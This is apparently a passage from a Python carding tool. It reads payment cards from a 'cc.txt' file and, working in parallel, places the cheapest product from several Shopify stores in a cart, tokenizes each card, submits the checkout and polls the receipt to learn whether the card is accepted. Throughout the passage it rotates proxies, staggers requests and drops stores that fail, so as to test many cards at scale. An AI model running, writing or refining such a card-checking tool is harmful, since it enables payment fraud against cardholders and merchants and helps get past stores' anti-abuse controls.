                poll_delay = receipt.get('pollDelay', 2000) if isinstance(receipt, dict) else 2000
                wait_seconds = min((poll_delay or 2000) / 1000.0, MAX_WAIT_SECONDS)
                _log(f"  [INFO] Still processing; waiting {wait_seconds:.2f}s before retry.")
                time.sleep(wait_seconds)
                continue
            _log(f"  [WARN] Unknown receipt typename: {rtype}; will retry.")
            time.sleep(SHORT_SLEEP)
            continue
        else:
            stub = {"_error": "HTTP_NOT_200", "_status": r.status_code, "_text_head": (r.text[:2000] if isinstance(r.text, str) else "")}
            if capture_log and attempt_blocks is not None:
                attempt_blocks.append(f"from {ordinal(attempt)} PollForReceipt\n\n" + json.dumps(stub, indent=2))
            _log(f"  [ERROR] HTTP {r.status_code} from PollForReceipt; retrying")
            time.sleep(SHORT_SLEEP)
            continue
    _log("  [TIMEOUT] Poll attempts exhausted; final state UNKNOWN or PROCESSING.")
    if last_response is not None:
        _log("\n[LAST_RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        _log("\n[RECEIPT_RESPONSE]")
        try:
            _log(json.dumps(last_response, indent=2))
        except Exception:
            pass
        return False, last_response, _compose_poll_log_text()
    final_stub = {"error": {"code": "TIMEOUT", "message": "Receipt polling timed out with no response"}}
    _log("\n[RECEIPT_RESPONSE]")
    try:
        _log(json.dumps(final_stub, indent=2))
    except Exception:
        pass
    return False, final_stub, _compose_poll_log_text()

def process_card(idx, card, sites, site_product_cache):
    try:
        time.sleep(random.uniform(PARALLEL_START_STAGGER_MIN_MS, PARALLEL_START_STAGGER_MAX_MS) / 1000.0)
    except Exception:
        pass
    tried_sites = set()
    worked = False
    site_attempt = 0
    skip_cc_due_to_unknown = False
    stop_cc_due_to_terminal = False
    stop_cc_after_result = False
    while site_attempt < len(sites) and not worked:
        candidates = [s for s in sites if s not in tried_sites]
        if not candidates:
            break
        site = random.choice(candidates)
        tried_sites.add(site)
        site_attempt += 1
        shop_url = normalize_shop_url(site)
        variant_id = None
        card_data = {**CARD_DATA, **card}
        site_label = format_site_label(shop_url)
        masked = mask_pan(card.get("number", ""))
        print("=" * 70)
        print(f"Starting {ordinal(idx)} CC ({masked}) on {ordinal(site_attempt)} site: {shop_url}")
        attempts = 0
        max_attempts = len(_proxies_list) if _proxies_list else 1
        if SUMMARY_ONLY or ('FAST_MODE' in globals() and FAST_MODE):
            max_attempts = min(max_attempts, 3)
        try:
            if 'SINGLE_PROXY_ATTEMPT' in globals() and SINGLE_PROXY_ATTEMPT:
                max_attempts = 1
        except Exception:
            pass
        site_skipped = False
        while attempts < max_attempts and not worked and not site_skipped:
            attempts += 1
            attempt_start_time = time.time()
            print(f"[INFO] {ordinal(idx)} CC, {ordinal(site_attempt)} site -> proxy attempt {attempts}/{max_attempts}")
            proxies_mapping, used_proxy_url = get_next_proxy_mapping()
            session = create_session(shop_url, proxies=proxies_mapping)
            with PRODUCT_CACHE_LOCK:
                cached = site_product_cache.get(shop_url)
            if cached:
                product_id, variant_id, price, title = cached
            else:
                product_id, variant_id, price, title = auto_detect_cheapest_product(session, shop_url)
                if variant_id:
                    with PRODUCT_CACHE_LOCK:
                        site_product_cache[shop_url] = (product_id, variant_id, price, title)
            if not variant_id:
                print("\n❌ [ERROR] Could not find any products on this site")
                print(f"[INFO] Switching to next proxy (attempt {attempts}/{max_attempts})")
                continue
            print(f"\n✅ Using: {title}")
            checkout_token, session_token, cookies = step1_add_to_cart_ctx(session, shop_url, variant_id)
            if not checkout_token or not session_token:
                print("\n[ERROR] Failed to create checkout")
                print("[INFO] Proxy considered working (CHECKOUT_FAILED), switching to next proxy")
                continue
            card_session_id = step2_tokenize_card_ctx(session, checkout_token, shop_url, card_data)
            if not card_session_id:
                print("\n[ERROR] Failed to tokenize card")
                print("[INFO] Proxy considered working (TOKEN_FAILED), switching to next proxy")
                continue
            queue_token, shipping_handle, merchandise_id, actual_total, delivery_expectations, phone_required = step3_proposal_ctx(
                session, checkout_token, session_token, card_session_id, shop_url, variant_id
            )
            if not queue_token or not shipping_handle:
                print("\n[ERROR] Failed to get proposal data")
                print("[INFO] Proxy considered working (PROPOSAL_FAILED), switching to next proxy")
                continue
            if not delivery_expectations or len(delivery_expectations) == 0:
                delivery_expectations = []
            receipt_result = step4_submit_completion_ctx(
                session, checkout_token, session_token, queue_token,
                shipping_handle, merchandise_id, card_session_id,
                actual_total, delivery_expectations, shop_url, variant_id, phone_required
            )
            if isinstance(receipt_result, tuple):
                if len(receipt_result) >= 4:
                    receipt_id, submit_code, submit_message, submit_resp = receipt_result
                else:
                    receipt_id, submit_code, submit_message = receipt_result
                    submit_resp = {}
            else:
                receipt_id = receipt_result
                submit_code = "UNKNOWN"
                submit_message = None
                submit_resp = {}
            if not receipt_id:
                try:
                    code_display = f'"code": "{str(submit_code)}"' if isinstance(submit_code, str) and submit_code else '"code": "UNKNOWN"'
                except Exception:
                    code_display = '"code": "UNKNOWN"'
                amount_display = format_amount(actual_total)
                emit_summary_line(card_data, code_display, amount_display, time.time() - attempt_start_time, site_label)

                try:
                    if isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT":
                        stop_cc_due_to_terminal = True
                        break
                except Exception:
                    pass

                try:
                    if is_unknown_code_display(code_display):
                        ts = int(time.time())
                        pan_last4 = re.sub(r"\D", "", card_data.get("number", "") or "")[-4:] or "xxxx"
                        site_token = re.sub(r"[^a-zA-Z0-9_-]+", "_", site_label or "site")
                        json_name = f"unknown_{site_token}_{pan_last4}_{ts}.json"
                        with open(json_name, "w", encoding="utf-8") as f:
                            json.dump(submit_resp if submit_resp else {"_source": "submit", "_code": str(submit_code)}, f, indent=2)
                except Exception:
                    pass
                try:
                    if STOP_AFTER_FIRST_RESULT:
                        stop_cc_after_result = True
                        break
                except Exception:
                    pass
                try:
                    if is_terminal_failure_code_display(code_display):
                        stop_cc_due_to_terminal = True
                        break
                except Exception:
                    pass
                try:
                    if STOP_AFTER_FIRST_RESULT:
                        stop_cc_after_result = True
                        break
                except Exception:
                    pass
                site_level_errors = {"MISSING_TOTAL", "CAPTCHA_METADATA_MISSING", "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP"}
                if isinstance(submit_code, str) and submit_code.upper() in site_level_errors:
                    if SITE_REMOVAL_ENABLED:
                        try:
                            remove_site_from_working_sites(shop_url)
                        except Exception:
                            pass
                    site_skipped = True
                    break
                else:
                    try:
                        if isinstance(submit_code, str) and submit_code.upper() == "GENERIC_ERROR":
                            worked = True
                            break
                    except Exception:
                        pass
                    try:
                        if (isinstance(submit_code, str) and submit_code.upper() == "PAYMENTS_CREDIT_CARD_BASE_EXPIRED") or ('"PAYMENTS_CREDIT_CARD_BASE_EXPIRED"' in str(code_display).upper()):
                            skip_cc_due_to_unknown = True
                            break
                    except Exception:
                        pass
                    try:
                        if is_unknown_code_display(code_display):
                            skip_cc_due_to_unknown = True
                            break
                    except Exception:
                        pass
                    continue
            success, poll_response, poll_log = step5_poll_receipt_ctx(session, checkout_token, session_token, receipt_id, shop_url, capture_log=True)
            try:
                code_display = extract_receipt_code(poll_response)
            except Exception:
                code_display = '"code": "UNKNOWN"'
            amount_display = format_amount(actual_total)
            emit_summary_line(card_data, code_display, amount_display, time.time() - attempt_start_time, site_label)
            if success:
                worked = True
                try:
                    if STOP_AFTER_FIRST_RESULT:
                        stop_cc_after_result = True
                        break
                except Exception:
                    pass
            else:
                try:
                    if is_unknown_code_display(code_display):
                        ts = int(time.time())
                        pan_last4 = re.sub(r"\D", "", card_data.get("number", "") or "")[-4:] or "xxxx"
                        site_token = re.sub(r"[^a-zA-Z0-9_-]+", "_", site_label or "site")
                        json_name = f"unknown_{site_token}_{pan_last4}_{ts}.json"
                        with open(json_name, "w", encoding="utf-8") as f:
                            json.dump(poll_response, f, indent=2)
                        if isinstance(poll_log, str) and poll_log.strip():
                            log_name = f"unknown_{site_token}_{pan_last4}_{ts}.log"
                            with open(log_name, "w", encoding="utf-8") as f:
                                f.write(poll_log)
                        skip_cc_due_to_unknown = True
                        break
                except Exception:
                    pass
                try:
                    if is_terminal_failure_code_display(code_display):
                        stop_cc_due_to_terminal = True
                        break
                except Exception:
                    pass
                try:
                    if STOP_AFTER_FIRST_RESULT:
                        stop_cc_after_result = True
                        break
                except Exception:
                    pass
        if skip_cc_due_to_unknown or stop_cc_due_to_terminal or stop_cc_after_result:
            break
        if not worked and not site_skipped:
            print(f"[INFO] All proxies exhausted for {ordinal(idx)} CC on site {shop_url}. Trying next site...")
    if not worked:
        print(f"[INFO] All sites exhausted for {ordinal(idx)} CC. Moving to next CC.")
    return worked

def main():
    sites = read_sites_from_file("working_sites.txt")
    if not sites:
        print("\n❌ [ERROR] No sites found in working_sites.txt")
        return
    cards = read_cc_file("cc.txt")
    if not cards:
        print("\n❌ [ERROR] No CC entries found in cc.txt")
        return
    if SUMMARY_ONLY:
        try:
            sys.stdout = open(os.devnull, "w", encoding="utf-8", errors="ignore")
        except Exception:
            pass
    else:
        print("=" * 70)
        print("Dynamic Shopify Checkout - Multi-CC Multi-Site (Parallel)")
        print("=" * 70)
        print(f"Total sites: {len(sites)} | Total CCs: {len(cards)}")
    site_product_cache = {}
    init_proxies()
    futures = []
    with ThreadPoolExecutor(max_workers=PARALLEL_THREADS) as executor:
        for idx, card in enumerate(cards, start=1):
            try:
                time.sleep(random.uniform(PARALLEL_START_STAGGER_MIN_MS, PARALLEL_START_STAGGER_MAX_MS) / 1000.0)
            except Exception:
                pass
            futures.append(executor.submit(process_card, idx, card, sites, site_product_cache))
        for f in futures:
            try:
                _ = f.result()
            except Exception as e:
                try:
                    print(f"[ERROR] Worker failed: {e}")
                except Exception:
                    pass
if __name__ == "__main__":
    main()